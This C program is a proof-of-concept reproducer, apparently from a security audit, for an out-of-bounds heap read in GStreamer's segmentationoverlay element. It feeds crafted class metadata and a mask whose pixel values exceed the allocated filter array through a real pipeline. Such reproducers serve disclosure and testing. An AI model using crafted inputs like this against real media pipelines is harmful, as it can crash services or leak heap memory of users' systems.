/* Real end-to-end repro for gst_segmentation_overlay_resampling()'s
 * mask_filter[mline[val]] out-of-bounds heap read (findings.toml OVF_12).
 *
 * Drives the real "segmentationoverlay" element through a real pipeline
 * (appsrc ! segmentationoverlay ! fakesink). A crafted GstAnalyticsClsMtd
 * with length=2 (only 2 declared classes) is attached alongside a
 * GstAnalyticsSegmentationMtd pointing at a mask GstBuffer whose pixel
 * bytes go up to 250 - once "selected-types" is set (a normal, documented
 * property for filtering which segment classes are drawn), the element
 * allocates a mask_filter[] array sized to the *class count* (2 booleans),
 * then indexes it directly with raw mask pixel bytes (0-255), reading far
 * past the 2-byte allocation.
 */
#include <gst/gst.h>
#include <gst/video/video.h>
#include <gst/analytics/analytics.h>

#define MASK_W 4
#define MASK_H 4
#define FRAME_W 4
#define FRAME_H 4
#define OOB_MASK_VALUE 250      /* well past the 2-entry mask_filter[] */
#define CLS_LENGTH 2

static GMainLoop *loop;

static gboolean
bus_cb (GstBus * bus, GstMessage * msg, gpointer data)
{
  switch (GST_MESSAGE_TYPE (msg)) {
    case GST_MESSAGE_EOS:
      g_print ("EOS\n");
      g_main_loop_quit (loop);
      break;
    case GST_MESSAGE_ERROR:{
      GError *err = NULL;
      gchar *dbg = NULL;
      gst_message_parse_error (msg, &err, &dbg);
      g_print ("ERROR: %s (%s)\n", err->message, dbg ? dbg : "no debug");
      g_error_free (err);
      g_free (dbg);
      g_main_loop_quit (loop);
      break;
    }
    default:
      break;
  }
  return TRUE;
}

int
main (int argc, char **argv)
{
  gst_init (&argc, &argv);

  GstElement *pipeline = gst_pipeline_new (NULL);
  GstElement *appsrc = gst_element_factory_make ("appsrc", NULL);
  GstElement *overlay = gst_element_factory_make ("segmentationoverlay", NULL);
  GstElement *sink = gst_element_factory_make ("fakesink", NULL);
  g_assert (appsrc && overlay && sink);

  g_object_set (overlay, "selected-types", "person", NULL);

  GstCaps *caps = gst_caps_new_simple ("video/x-raw",
      "format", G_TYPE_STRING, "I420",
      "width", G_TYPE_INT, FRAME_W,
      "height", G_TYPE_INT, FRAME_H,
      "framerate", GST_TYPE_FRACTION, 1, 1, NULL);
  g_object_set (appsrc, "caps", caps, "format", GST_FORMAT_TIME, NULL);

  gst_bin_add_many (GST_BIN (pipeline), appsrc, overlay, sink, NULL);
  g_assert (gst_element_link_many (appsrc, overlay, sink, NULL));

  GstVideoInfo vinfo;
  gst_video_info_from_caps (&vinfo, caps);
  GstBuffer *frame_buf = gst_buffer_new_and_alloc (vinfo.size);
  gst_buffer_memset (frame_buf, 0, 0, vinfo.size);

  /* mask buffer: GRAY8 MASK_W x MASK_H, every pixel set to OOB_MASK_VALUE */
  GstVideoInfo minfo;
  gst_video_info_set_format (&minfo, GST_VIDEO_FORMAT_GRAY8, MASK_W, MASK_H);
  GstBuffer *mask_buf = gst_buffer_new_and_alloc (minfo.size);
  gst_buffer_memset (mask_buf, 0, OOB_MASK_VALUE, minfo.size);
  gst_buffer_add_video_meta (mask_buf, GST_VIDEO_FRAME_FLAG_NONE,
      GST_VIDEO_FORMAT_GRAY8, MASK_W, MASK_H);

  GstAnalyticsRelationMeta *rmeta =
      gst_buffer_add_analytics_relation_meta (frame_buf);
  g_assert (rmeta != NULL);

  gfloat conf_lvl[CLS_LENGTH] = { 0.9f, 0.9f };
  GQuark class_quarks[CLS_LENGTH] = {
    g_quark_from_string ("person"),
    g_quark_from_string ("car"),
  };
  GstAnalyticsClsMtd clsmtd;
  gboolean ok = gst_analytics_relation_meta_add_cls_mtd (rmeta, CLS_LENGTH,
      conf_lvl, class_quarks, &clsmtd);
  g_assert (ok);

  GstAnalyticsSegmentationMtd segmtd;
  ok = gst_analytics_relation_meta_add_segmentation_mtd (rmeta, mask_buf,
      GST_SEGMENTATION_TYPE_SEMANTIC, 0, NULL, 0, 0, MASK_W, MASK_H, &segmtd);
  g_assert (ok);

  ok = gst_analytics_relation_meta_set_relation (rmeta,
      GST_ANALYTICS_REL_TYPE_N_TO_N, segmtd.id, clsmtd.id);
  g_assert (ok);

  loop = g_main_loop_new (NULL, FALSE);
  GstBus *bus = gst_pipeline_get_bus (GST_PIPELINE (pipeline));
  gst_bus_add_watch (bus, bus_cb, NULL);

  gst_element_set_state (pipeline, GST_STATE_PLAYING);

  g_print ("pushing a frame with a real GstAnalyticsRelationMeta: "
      "cls_mtd length=%d, mask pixels=%d, selected-types set (forces a "
      "%d-entry mask_filter[] allocation)...\n", CLS_LENGTH, OOB_MASK_VALUE,
      CLS_LENGTH);
  GstFlowReturn fret;
  g_signal_emit_by_name (appsrc, "push-buffer", frame_buf, &fret);
  g_assert (fret == GST_FLOW_OK);
  gst_buffer_unref (frame_buf);
  g_signal_emit_by_name (appsrc, "end-of-stream", &fret);

  g_main_loop_run (loop);

  g_print ("returned normally (should have crashed before this line if the "
      "bug fired)\n");

  gst_element_set_state (pipeline, GST_STATE_NULL);
  gst_object_unref (bus);
  gst_object_unref (pipeline);
  gst_caps_unref (caps);
  g_main_loop_unref (loop);
  gst_deinit ();
  return 0;
}
